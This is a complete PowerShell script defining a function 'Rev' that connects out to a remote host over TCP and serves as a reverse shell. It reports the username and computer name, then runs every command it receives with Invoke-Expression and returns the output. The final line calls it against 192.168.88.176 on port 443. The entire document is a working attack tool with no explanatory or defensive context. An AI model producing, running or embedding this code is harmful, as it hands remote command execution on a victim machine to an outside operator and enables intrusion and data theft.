function Rev {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$IPAddress,

        [Parameter(Mandatory = $true, Position = 1)]
        [int]$Port
    )

    try {
        $client = [System.Net.Sockets.TcpClient]::new($IPAddress, $Port)
        $stream = $client.GetStream()

        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

        $banner = "Windows PowerShell running as user $env:USERNAME on $env:COMPUTERNAME`n" +
                  "Copyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"

        $sendBytes = [Text.Encoding]::ASCII.GetBytes($banner)
        $stream.Write($sendBytes, 0, $sendBytes.Length)

        $prompt = "PS $((Get-Location).Path)>"
        $sendBytes = [Text.Encoding]::ASCII.GetBytes($prompt)
        $stream.Write($sendBytes, 0, $sendBytes.Length)

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = [Text.Encoding]::ASCII.GetString($bytes, 0, $i)

            try {
                $sendBack = Invoke-Expression -Command $data 2>&1 |
                            Out-String
            }
            catch {
                $sendBack = "Error: $($_.Exception.Message)`n"
            }

            $sendBack += "PS $((Get-Location).Path)> "

            $sendBytes = [Text.Encoding]::ASCII.GetBytes($sendBack)
            $stream.Write($sendBytes, 0, $sendBytes.Length)
            $stream.Flush()
        }
    }
    catch {
        Write-Warning "Error"
        Write-Error $_
    }
    finally {
        if ($stream) {
            $stream.Dispose()
        }

        if ($client) {
            $client.Close()
        }
    }
}

Rev -IPaddress 192.168.88.176 -Port 443

